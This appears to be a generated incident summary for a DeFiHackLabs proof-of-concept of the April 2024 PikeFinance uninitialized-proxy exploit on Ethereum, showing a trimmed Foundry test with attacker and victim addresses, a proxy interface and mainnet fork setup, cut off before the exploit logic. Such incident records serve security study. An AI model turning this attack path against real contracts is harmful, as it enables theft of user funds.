# [?] PikeFinance - Uninitialized Proxy

## Summary
Severity: Unknown
Chain: Ethereum
Component: PikeFinance
Published: 2024-04-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/PikeFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1.4M

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : 1.4M
// Attacker : https://etherscan.io/address/0x19066f7431df29a0910d287c8822936bb7d89e23
// Attack Contract : https://etherscan.io/address/0x1da4bc596bfb1087f2f7999b0340fcba03c47fbd
// Vulnerable Contract : https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063
// Attack Tx : https://etherscan.io/tx/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :

interface IPikeFinanceProxy {
    function initialize(address, address, address, address, uint16, uint16) external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract PikeFinance is Test {
    uint256 blocknumToForkFrom = 19_771_058;
    address constant PikeFinanceProxy = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function setUp() public {
        vm.deal(address(this), 0);
        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public {
        emit log_named_decimal_uint(" Attacker ETH Balance Before exploit", address(this).balance, 18);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/PikeFinance_exp.sol_
